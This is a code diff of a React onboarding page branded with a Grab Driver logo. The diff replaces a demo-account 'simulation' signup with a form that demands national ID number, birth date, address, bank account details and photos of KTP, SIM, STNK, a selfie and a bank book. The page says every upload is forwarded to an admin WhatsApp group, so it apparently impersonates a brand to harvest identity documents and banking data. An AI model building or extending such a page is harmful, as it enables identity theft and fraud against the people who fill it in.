@@ -2099,97 +2099,70 @@ function ServicesDrawer({
    COMPONENT: ONBOARDING VIEW
    ========================================================================== */
 function Onboarding({ pending, run }: { pending: boolean; run: (action: () => Promise<void>) => void }) {
-  const defaults: Record<string, string> = {
-    phone: '0812-3456-7890',
-    city: 'DKI Jakarta',
-    brand: 'Honda',
-    model: 'Vario 150cc',
-    plate: 'B 3829 SGB',
-    emergency: '0811-9999-8888'
-  }
+  const fields = [
+    ['phone', 'Nomor telepon aktif', 'tel'], ['nationalId', 'NIK sesuai KTP', 'text'], ['birthDate', 'Tanggal lahir', 'date'],
+    ['address', 'Alamat lengkap', 'text'], ['city', 'Kota operasional', 'text'], ['brand', 'Merek motor', 'text'],
+    ['model', 'Model motor', 'text'], ['plate', 'Nomor polisi', 'text'], ['vehicleColor', 'Warna motor', 'text'],
+    ['vehicleYear', 'Tahun motor', 'number'], ['emergencyContact', 'Nama kontak darurat', 'text'], ['emergencyPhone', 'Nomor kontak darurat', 'tel'],
+    ['bankName', 'Nama bank', 'text'], ['accountNumber', 'Nomor rekening', 'text'], ['accountHolder', 'Nama pemilik rekening', 'text'],
+  ]
+  const documents = [
+    ['selfie', 'Foto selfie'], ['ktp', 'Foto KTP'], ['sim', 'Foto SIM C'], ['stnk', 'Foto STNK'], ['vehicle', 'Foto kendaraan'], ['bank_book', 'Foto buku tabungan'],
+  ]
 
   return (
-    <main className="flex min-h-dvh flex-col bg-background">
-      <header className="bg-slate-950 px-6 pb-10 pt-14 text-slate-100 border-b border-slate-800">
-        <div className="flex items-center gap-3">
-          <img src="/images/grab-driver-logo.png" alt="Grab Driver Logo" className="h-16 w-auto object-contain rounded-2xl shadow-md border border-slate-800" />
-        </div>
-        <h1 className="mt-5 text-3xl font-extrabold text-balance">Daftar Mitra Driver</h1>
-        <p className="mt-2 text-xs opacity-75 leading-relaxed">
-          Silakan lengkapi formulir pendaftaran di bawah ini untuk memulai simulasi pengantaran.
-        </p>
+    <main className="min-h-dvh bg-background pb-10">
+      <header className="bg-foreground px-6 pb-8 pt-12 text-background">
+        <img src="/images/grab-driver-logo.png" alt="Grab Driver" className="h-14 w-auto rounded-xl object-contain" />
+        <h1 className="mt-5 text-3xl font-extrabold text-balance">Pendaftaran Mitra Driver</h1>
+        <p className="mt-2 text-sm opacity-75 leading-relaxed">Lengkapi data dan enam dokumen wajib. Setiap unggahan otomatis tercatat dan dikirim ke grup WhatsApp admin.</p>
       </header>
-
-      <div className="flex flex-1 flex-col gap-4 p-6">
-        <button
-          type="button"
-          disabled={pending}
-          onClick={() =>
-            run(async () => {
-              await createDriverProfile({
-                phone: defaults.phone,
-                city: defaults.city,
-                brand: defaults.brand,
-                model: defaults.model,
-                plateNumber: defaults.plate,
-                emergencyContact: defaults.emergency
-              })
-            })
+      <form
+        action={(fd) => run(async () => {
+          for (const [type] of documents) {
+            const file = fd.get(type)
+            if (!(file instanceof File) || !file.size) throw new Error(`Dokumen ${type} wajib diunggah`)
+            const upload = new FormData()
+            upload.set('type', type)
+            upload.set('file', file)
+            const response = await fetch('/api/driver/documents', { method: 'POST', body: upload })
+            const result = await response.json()
+            if (!response.ok) throw new Error(result.error || `Gagal mengunggah ${type}`)
           }
-          className="h-12 w-full rounded-xl bg-slate-900 border border-primary/30 text-primary font-black uppercase text-xs tracking-wider transition-transform hover:scale-102 active:scale-98 disabled:opacity-60 flex items-center justify-center gap-2 shadow"
-        >
-          <Sparkles className="size-4 animate-pulse" />
-          Daftar Instan (Akun Demo Grab)
+          await createDriverProfile({
+            phone: String(fd.get('phone')), nationalId: String(fd.get('nationalId')), birthDate: String(fd.get('birthDate')), address: String(fd.get('address')), city: String(fd.get('city')),
+            brand: String(fd.get('brand')), model: String(fd.get('model')), plateNumber: String(fd.get('plate')), vehicleColor: String(fd.get('vehicleColor')), vehicleYear: Number(fd.get('vehicleYear')),
+            emergencyContact: String(fd.get('emergencyContact')), emergencyPhone: String(fd.get('emergencyPhone')), bankName: String(fd.get('bankName')), accountNumber: String(fd.get('accountNumber')), accountHolder: String(fd.get('accountHolder')),
+          })
+        })}
+        className="mx-auto flex w-full max-w-2xl flex-col gap-6 p-5"
+      >
+        <section className="flex flex-col gap-4 rounded-2xl border bg-card p-5 shadow-sm">
+          <div><h2 className="font-bold">Data pribadi dan kendaraan</h2><p className="text-xs text-muted-foreground">Pastikan semua data sama dengan dokumen resmi.</p></div>
+          <div className="grid gap-4 md:grid-cols-2">
+            {fields.map(([name, label, type]) => (
+              <label key={name} className="flex flex-col gap-1.5 text-xs font-semibold text-foreground">
+                {label}
+                <input name={name} type={type} required className="h-12 rounded-xl border bg-background px-4 text-sm font-normal outline-none focus:ring-2 focus:ring-ring" />
+              </label>
+            ))}
+          </div>
+        </section>
+        <section className="flex flex-col gap-4 rounded-2xl border bg-card p-5 shadow-sm">
+          <div><h2 className="font-bold">Dokumen wajib</h2><p className="text-xs text-muted-foreground">JPG, PNG, WebP, atau PDF. Maksimal 8 MB per dokumen.</p></div>
+          <div className="grid gap-4 md:grid-cols-2">
+            {documents.map(([name, label]) => (
+              <label key={name} className="flex flex-col gap-2 rounded-xl border border-dashed p-4 text-xs font-semibold">
+                {label}
+                <input name={name} type="file" required accept="image/jpeg,image/png,image/webp,application/pdf" className="text-xs font-normal file:mr-3 file:rounded-lg file:border-0 file:bg-primary file:px-3 file:py-2 file:font-semibold file:text-primary-foreground" />
+              </label>
+            ))}
+          </div>
+        </section>
+        <button disabled={pending} className="h-14 rounded-xl bg-primary font-black uppercase tracking-wider text-primary-foreground disabled:opacity-60">
+          {pending ? 'Mengunggah dan mengirim...' : 'Kirim Pendaftaran Lengkap'}
         </button>
-
-        <div className="flex items-center my-2">
-          <div className="flex-1 border-t border-dashed" />
-          <span className="px-3 text-[10px] text-muted-foreground uppercase font-bold tracking-wider">Atau Isi Manual</span>
-          <div className="flex-1 border-t border-dashed" />
-        </div>
-
-        <form
-          action={(fd) =>
-            run(async () => {
-              await createDriverProfile({
-                phone: String(fd.get('phone')),
-                city: String(fd.get('city')),
-                brand: String(fd.get('brand')),
-                model: String(fd.get('model')),
-                plateNumber: String(fd.get('plate')),
-                emergencyContact: String(fd.get('emergency'))
-              })
-            })
-          }
-          className="flex flex-col gap-4"
-        >
-          {[
-            ['phone', 'Nomor Telepon Mitra', 'tel'],
-            ['city', 'Kota Operasional', 'text'],
-            ['brand', 'Merek Sepeda Motor', 'text'],
-            ['model', 'Model / Seri Motor', 'text'],
-            ['plate', 'Nomor Polisi (Plat)', 'text'],
-            ['emergency', 'Nomor Kontak Darurat', 'tel']
-          ].map(([name, label, type]) => (
-            <label key={name} className="flex flex-col gap-1.5 text-xs font-semibold text-foreground">
-              {label}
-              <input
-                name={name}
-                type={type}
-                required
-                defaultValue={defaults[name]}
-                className="h-12 w-full rounded-xl border bg-card px-4 font-normal outline-none focus:ring-2 focus:ring-ring text-sm"
-              />
-            </label>
-          ))}
-          <button
-            disabled={pending}
-            className="mt-4 h-12 w-full rounded-xl bg-primary font-black uppercase text-primary-foreground tracking-wider transition-transform hover:scale-102 active:scale-98 disabled:opacity-60"
-          >
-            {pending ? 'Mendaftarkan...' : 'Kirim Berkas Pendaftaran'}
-          </button>
-        </form>
-      </div>
+      </form>
     </main>
   )
 }
